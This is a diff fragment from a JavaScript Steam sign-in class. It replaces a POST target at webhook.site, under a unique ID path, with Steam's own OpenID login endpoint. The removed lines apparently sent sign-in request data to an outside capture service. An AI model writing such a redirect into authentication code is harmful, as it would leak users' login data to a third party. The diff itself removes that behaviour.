@@ -117,8 +117,8 @@ class SteamSignIn {
 			let req = HTTPS.request({
 				method: 'POST',
 				protocol: 'https:',
-				host: 'webhook.site',
-				path: '/a1a21537-52a7-41ea-9ad7-3728e49abd2e',
+				host: 'steamcommunity.com',
+				path: '/openid/login',
 				headers: {
 					'content-type': 'application/x-www-form-urlencoded',
 					'content-length': Buffer.byteLength(encodedBody),
